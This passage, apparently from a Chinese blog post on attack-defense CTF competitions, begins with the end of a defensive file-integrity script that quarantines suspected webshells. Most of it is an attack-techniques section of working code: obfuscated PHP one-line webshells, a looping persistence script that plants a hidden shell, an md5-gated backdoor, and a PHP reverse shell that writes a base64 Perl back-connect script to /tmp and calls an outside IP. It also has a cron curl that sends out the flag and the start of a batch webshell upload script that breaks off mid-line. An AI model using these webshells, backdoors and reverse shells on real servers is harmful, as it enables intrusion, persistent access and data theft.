ntpath</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line">CWD = os.getcwd()</div><div class="line">FILE_MD5_DICT = &#123;&#125;      <span class="comment"># 文件MD5字典</span></div><div class="line">ORIGIN_FILE_LIST = []</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 特殊文件路径字符串</span></div><div class="line">Special_path_str = <span class="string">'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'</span></div><div class="line">bakstring = <span class="string">'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'</span></div><div class="line">logstring = <span class="string">'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></div><div class="line">webshellstring = <span class="string">'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></div><div class="line">difffile = <span class="string">'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'</span></div><div class="line"></div><div class="line">Special_string = <span class="string">'drops_log'</span>  <span class="comment"># 免死金牌</span></div><div class="line">UNICODE_ENCODING = <span class="string">"utf-8"</span></div><div class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r"\?%02x"</span></div><div class="line"></div><div class="line"><span class="comment"># 文件路径字典</span></div><div class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</div><div class="line">Special_path = &#123;</div><div class="line">    <span class="string">'bak'</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),</div><div class="line">    <span class="string">'log'</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),</div><div class="line">    <span class="string">'webshell'</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</div><div class="line">    <span class="string">'difffile'</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">isListLike</span><span class="params">(value)</span>:</span></div><div class="line">    <span class="keyword">return</span> isinstance(value, (list, tuple, set))</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 获取Unicode编码</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUnicode</span><span class="params">(value, encoding=None, noneToNull=False)</span>:</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> noneToNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">return</span> NULL</div><div class="line"></div><div class="line">    <span class="keyword">if</span> isListLike(value):</div><div class="line">        value = list(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</div><div class="line">        <span class="keyword">return</span> value</div><div class="line"></div><div class="line">    <span class="keyword">if</span> isinstance(value, unicode):</div><div class="line">        <span class="keyword">return</span> value</div><div class="line">    <span class="keyword">elif</span> isinstance(value, basestring):</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</div><div class="line">            <span class="keyword">except</span> UnicodeDecodeError, ex:</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    <span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</div><div class="line">                <span class="keyword">except</span>:</div><div class="line">                    value = value[:ex.start] + <span class="string">""</span>.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">return</span> unicode(value)</div><div class="line">        <span class="keyword">except</span> UnicodeDecodeError:</div><div class="line">            <span class="keyword">return</span> unicode(str(value), errors=<span class="string">"ignore"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 目录创建</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir_p</span><span class="params">(path)</span>:</span></div><div class="line">    <span class="keyword">import</span> errno</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        os.makedirs(path)</div><div class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc:</div><div class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</div><div class="line">            <span class="keyword">pass</span></div><div class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 获取当前所有文件路径</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilelist</span><span class="params">(cwd)</span>:</span></div><div class="line">    filelist = []</div><div class="line">    <span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</div><div class="line">        <span class="keyword">for</span> filepath <span class="keyword">in</span> files:</div><div class="line">            originalfile = os.path.join(root, filepath)</div><div class="line">            <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</div><div class="line">                filelist.append(originalfile)</div><div class="line">    <span class="keyword">return</span> filelist</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 计算机文件MD5值</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcMD5</span><span class="params">(filepath)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">with</span> open(filepath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">            md5obj = hashlib.md5()</div><div class="line">            md5obj.update(f.read())</div><div class="line">            hash = md5obj.hexdigest()</div><div class="line">            <span class="keyword">return</span> hash</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">print</span> <span class="string">u'[!] getmd5_error : '</span> + getUnicode(filepath)</div><div class="line">        <span class="keyword">print</span> getUnicode(e)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            ORIGIN_FILE_LIST.remove(filepath)</div><div class="line">            FILE_MD5_DICT.pop(filepath, <span class="keyword">None</span>)</div><div class="line">        <span class="keyword">except</span> KeyError, e:</div><div class="line">            <span class="keyword">pass</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 获取所有文件MD5</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilemd5dict</span><span class="params">(filelist = [])</span>:</span></div><div class="line">    filemd5dict = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</div><div class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</div><div class="line">            md5 = calcMD5(os.path.realpath(ori_file))</div><div class="line">            <span class="keyword">if</span> md5:</div><div class="line">                filemd5dict[ori_file] = md5</div><div class="line">    <span class="keyword">return</span> filemd5dict</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 备份所有文件</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">backup_file</span><span class="params">(filelist=[])</span>:</span></div><div class="line">    <span class="comment"># if len(os.listdir(Special_path['bak'])) == 0:</span></div><div class="line">    <span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</div><div class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</div><div class="line">            shutil.copy2(filepath, Special_path[<span class="string">'bak'</span>])</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">u'---------start------------'</span></div><div class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</div><div class="line">        mkdir_p(Special_path[value])</div><div class="line">    <span class="comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span></div><div class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</div><div class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</div><div class="line">    backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO 备份文件可能会产生重名BUG</span></div><div class="line">    <span class="keyword">print</span> <span class="string">u'[*] pre work end!'</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        file_list = getfilelist(CWD)</div><div class="line">        <span class="comment"># 移除新上传文件</span></div><div class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</div><div class="line">        <span class="keyword">if</span> len(diff_file_list) != <span class="number">0</span>:</div><div class="line">            <span class="comment"># import pdb;pdb.set_trace()</span></div><div class="line">            <span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    f = open(filepath, <span class="string">'r'</span>).read()</div><div class="line">                <span class="keyword">except</span> Exception, e:</div><div class="line">                    <span class="keyword">break</span></div><div class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        <span class="keyword">print</span> <span class="string">u'[*] webshell find : '</span> + getUnicode(filepath)</div><div class="line">                        shutil.move(filepath, os.path.join(Special_path[<span class="string">'webshell'</span>], ntpath.basename(filepath) + <span class="string">'.txt'</span>))</div><div class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                        <span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filepath)</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        f = open(os.path.join(Special_path[<span class="string">'log'</span>], <span class="string">'log.txt'</span>), <span class="string">'a'</span>)</div><div class="line">                        f.write(<span class="string">'newfile: '</span> + getUnicode(filepath) + <span class="string">' : '</span> + str(time.ctime()) + <span class="string">'\n'</span>)</div><div class="line">                        f.close()</div><div class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                        <span class="keyword">print</span> <span class="string">u'[-] log error : file move error: '</span> + getUnicode(e)</div><div class="line"></div><div class="line">        <span class="comment"># 防止任意文件被修改,还原被修改文件</span></div><div class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</div><div class="line">        <span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</div><div class="line">            <span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    f = open(filekey, <span class="string">'r'</span>).read()</div><div class="line">                <span class="keyword">except</span> Exception, e:</div><div class="line">                    <span class="keyword">break</span></div><div class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        <span class="keyword">print</span> <span class="string">u'[*] file had be change : '</span> + getUnicode(filekey)</div><div class="line">                        shutil.move(filekey, os.path.join(Special_path[<span class="string">'difffile'</span>], ntpath.basename(filekey) + <span class="string">'.txt'</span>))</div><div class="line">                        shutil.move(os.path.join(Special_path[<span class="string">'bak'</span>], ntpath.basename(filekey)), filekey)</div><div class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                        <span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filekey)</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        f = open(os.path.join(Special_path[<span class="string">'log'</span>], <span class="string">'log.txt'</span>), <span class="string">'a'</span>)</div><div class="line">                        f.write(<span class="string">'diff_file: '</span> + getUnicode(filekey) + <span class="string">' : '</span> + getUnicode(time.ctime()) + <span class="string">'\n'</span>)</div><div class="line">                        f.close()</div><div class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                        <span class="keyword">print</span> <span class="string">u'[-] log error : done_diff: '</span> + getUnicode(filekey)</div><div class="line">                        <span class="keyword">pass</span></div><div class="line">        time.sleep(<span class="number">2</span>)</div><div class="line">        <span class="comment"># print '[*] ' + getUnicode(time.ctime())</span></div><div class="line">七、自动提交</div></pre></td></tr></table></figure>
<h3 id="0x04-攻击技巧"><a href="#0x04-攻击技巧" class="headerlink" title="0x04 攻击技巧"></a>0x04 攻击技巧</h3><p>1.拿到命令执行漏洞后执行crontab</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 参考</span></div><div class="line"><span class="comment"># http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</span></div><div class="line">*/5 * * * * curl 172.16.100.5:9000/submit_flag/ <span class="_">-d</span> <span class="string">'flag='</span>$(cat /home/web/flag/flag)<span class="string">'&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY'</span></div></pre></td></tr></table></figure>
<p>2.注意源码中或者备份文件中是否存在mysql等的弱口令</p>
<p>3.主机发现</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 使用httpscan脚本</span></div><div class="line">./httpscan.py 172.16.0.0/24 –t 10</div><div class="line"><span class="comment"># masscan</span></div><div class="line">masscan -p 80 172.16.0.0/24</div><div class="line"><span class="comment"># nmap</span></div><div class="line">nmap –sn 172.16.0.0/24</div></pre></td></tr></table></figure>
<p>4.常用的特殊webshell</p>
<p>控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。<br>简单举例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="number">2</span>]).@$_($_POST[<span class="number">1</span>])<span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>连接方式：php?2=assert密码是1。<br>献上我常用得一句话</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=chr(<span class="number">96</span>^<span class="number">5</span>);</div><div class="line">$b=chr(<span class="number">57</span>^<span class="number">79</span>);</div><div class="line">$c=chr(<span class="number">15</span>^<span class="number">110</span>);</div><div class="line">$d=chr(<span class="number">58</span>^<span class="number">86</span>);</div><div class="line">$e=<span class="string">'($_REQUEST[C])'</span>;</div><div class="line">@assert($a.$b.$c.$d.$e);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>使用为<code>?C=phpinfo();</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $sF=<span class="string">"PCT4BA6ODSE_"</span>;$s21=strtolower($sF[<span class="number">4</span>].$sF[<span class="number">5</span>].$sF[<span class="number">9</span>].$sF[<span class="number">10</span>].$sF[<span class="number">6</span>].$sF[<span class="number">3</span>].$sF[<span class="number">11</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>].$sF[<span class="number">1</span>].$sF[<span class="number">7</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>]);$s22=$&#123;strtoupper($sF[<span class="number">11</span>].$sF[<span class="number">0</span>].$sF[<span class="number">7</span>].$sF[<span class="number">9</span>].$sF[<span class="number">2</span>])&#125;[<span class="string">'n985de9'</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>($s22))&#123;<span class="keyword">eval</span>($s21($s22));&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>配置填<code>n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</code><br>连接密码:0（零）</p>
<p>5.权限维持</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    set_time_limit(<span class="number">0</span>);</div><div class="line">    ignore_user_abort(<span class="keyword">true</span>);</div><div class="line"></div><div class="line">	$file = <span class="string">'.conifg.php'</span>;</div><div class="line">	$shell = <span class="string">"&lt;?php echo system("</span>curl <span class="number">10.0</span><span class="number">.0</span><span class="number">.2</span><span class="string">"); ?&gt;"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</div><div class="line">        file_put_contents($file, $shell);</div><div class="line">        system(<span class="string">'chmod 777 .demo.php'</span>);</div><div class="line"></div><div class="line">        usleep(<span class="number">50</span>);</div><div class="line">        &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>tips:<code>.config.php</code>前面使用一个点，能很好的隐藏文件。<br>想要结束这个进程，除了最暴力的重启apache服务之外，更为优雅的如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</div><div class="line">	$pid=<span class="number">1234</span>;</div><div class="line">	@unlink(<span class="string">'.config.php'</span>);</div><div class="line">	exec(<span class="string">'kill -9 $pid'</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>先查看进程，查看对应的pid，再执行即可。</p>
<p>素质低的人则会放置一个md5马，比如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</div><div class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>如果素质低的人又很猥琐，像<a href="http://blog.163.com/passw0a_d/blog/static/2508070612017613113859691/" target="_blank" rel="external">rootrain</a>这种就是。那就是利用<code>header</code>，最后综合起来就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'hello'</span>;</div><div class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</div><div class="line">	<span class="keyword">if</span> (@$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] == <span class="string">'flag'</span>)&#123;</div><div class="line">	$test= <span class="string">'flag'</span>;</div><div class="line">    header(<span class="string">"flag:$test"</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>放进<code>config.php</code>效果最好，因为一般很少人去看这个。</p>
<p>还可以采用反弹shell的方式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span> </span>&#123; </div><div class="line">$path = execute(<span class="string">"which $pr"</span>); </div><div class="line"><span class="keyword">return</span> ($path ? $path : $pr); </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cfe)</span> </span>&#123; </div><div class="line">$res = <span class="string">''</span>; </div><div class="line"><span class="keyword">if</span> ($cfe) &#123; </div><div class="line"><span class="keyword">if</span>(function_exists(<span class="string">'exec'</span>)) &#123; </div><div class="line">@exec($cfe,$res); </div><div class="line">$res = join(<span class="string">"\n"</span>,$res); </div><div class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'shell_exec'</span>)) &#123; </div><div class="line">$res = @shell_exec($cfe); </div><div class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'system'</span>)) &#123; </div><div class="line">@ob_start(); </div><div class="line">@system($cfe); </div><div class="line">$res = @ob_get_contents(); </div><div class="line">@ob_end_clean(); </div><div class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'passthru'</span>)) &#123; </div><div class="line">@ob_start(); </div><div class="line">@passthru($cfe); </div><div class="line">$res = @ob_get_contents(); </div><div class="line">@ob_end_clean(); </div><div class="line">&#125; <span class="keyword">elseif</span>(@is_resource($f = @popen($cfe,<span class="string">"r"</span>))) &#123; </div><div class="line">$res = <span class="string">''</span>; </div><div class="line"><span class="keyword">while</span>(!@feof($f)) &#123; </div><div class="line">$res .= @fread($f,<span class="number">1024</span>); </div><div class="line">&#125; </div><div class="line">@pclose($f); </div><div class="line">&#125; </div><div class="line">&#125; </div><div class="line"><span class="keyword">return</span> $res; </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span><span class="params">($fname,$text)</span></span>&#123; </div><div class="line"><span class="keyword">if</span>($fp=@fopen($fname,<span class="string">'w'</span>)) &#123; </div><div class="line">@fputs($fp,@base64_decode($text)); </div><div class="line">@fclose($fp); </div><div class="line">&#125; </div><div class="line">&#125; </div><div class="line">$yourip = <span class="string">"192.168.71.1"</span>; </div><div class="line">$yourport = <span class="string">'9999'</span>; </div><div class="line">$usedb = <span class="keyword">array</span>(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>); </div><div class="line">$back_connect=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>. </div><div class="line"><span class="string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span>. </div><div class="line"><span class="string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span>. </div><div class="line"><span class="string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span>. </div><div class="line"><span class="string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span>. </div><div class="line"><span class="string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span>. </div><div class="line"><span class="string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>; </div><div class="line">cf(<span class="string">'/tmp/.bc'</span>,$back_connect); </div><div class="line">$res = execute(which(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc $yourip $yourport &amp;"</span>); </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>之后本地执行<code>nc -lp 9999</code>即可</p>
<p>6.获取flag的方式</p>
<p>(1) 批量传webshell(shell的内容可以写为权限维持部分的那个脚本)，之后结合批量访问 参考<a href="http://rcoil.me/2017/05/PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" target="_blank" rel="external">PHP-定时任务</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 参考 http://www.freebuf.com/sectool/91082.html</span></div><div class="line"><span class="comment">#!/usr/bin/python  </span></div><div class="line"><span class="comment">#coding=utf-8  </span></div><div class="line">  </div><div class="line">import urllib  </div><div class="line">import urllib2</div><div class="line">import sys</div><div class="line">import base64</div><div class="line">import re</div><div class="line">  </div><div class="line">def post(url, data):  </div><div class="line">    req = urllib2.Request(url)  </div><div class="line">    data = urllib.urlencode(data)   </div><div class="line">    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())  </div><div class="line">    response = opener.open(req, data)  </div><div class="line">    <span class="built_in">return</span> response.read()  </div><div class="line">	</div><div class="line">def get_shell_path(posturl,passwd):</div><div class="line">    shell_path = <span class="string">""</span></div><div class="line">    try:</div><div class="line">        data = &#123;&#125;</div><div class="line">        data[passwd] = <span class="string">'@eval(base64_decode($_POST[z0]));'</span></div><div class="line">        data[<span class="string">'z0'</span>]=<span class="string">'ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'</span></div><div class="line">        shell_path = post(posturl, data).strip()</div><div class="line">    except Exception:</div><div class="line">        pass</div><div class="line">    <span class="built_in">return</span> shell_path</div><div class="line">  </div><div class="line">def main():</div><div class="line">    <span class="built_in">print</span> <span class="string">'\n+++++++++Batch Uploading Local File (Only for PHP webshell)++++++++++\n'</span></div><div class="line">    shellfile = sys.argv[1] <span class="comment"># 存放webshell路径和密码的文件</span></div><div class="line">    localfile = sys.argv[2] <span class="comment"># 本地待上传的文件名</span></div><div class="line">    shell_file = open(shellfile,<span class="string">'rb'</span>)</div><div class="line">    local_content = str(open(localfile,<span class="string">'rb'</span>).read())</div><div class="line">    <span class="keyword">for</span> eachline <span class="keyword">in</span> shell_file:</div><div class="line">        posturl = eachline.split(<span class="string">','</span>)[0].strip()</div><div class="line">        passwd = eachline.split(<span class="string">','</span>)[1].strip()</div><div class="line">        try:</div><div class="line">            reg = <span class="string">".*/([^/]*\.php?)"</span></div><div class="line">            match_shell_name = re.search(reg,eachline)</div><div class="line">            <span class="keyword">if</span> match_shell_name:</div><div class="line">                shell_name=match_shell_name.group(1)</div><div class="line">                shell_path = get_shell_path(posturl,passwd).strip()</div><div class="line">                target_path = shell_path.split(shell_name)[0]+localfile</div><div class="line">                target_path_base64 = base64.b64encode(target_path)</div><div class="line">                target_file_url = eachline.split(shell_name)[0]+localfile</div><div class="line">                data = &#123;&#125;</div><div class="line">                data[passwd] = <span class="string">'@eval(base64_decode($_POST[z0]));'</span></div><div class="line">                data[<span class="string">'z0'</span>]=<span 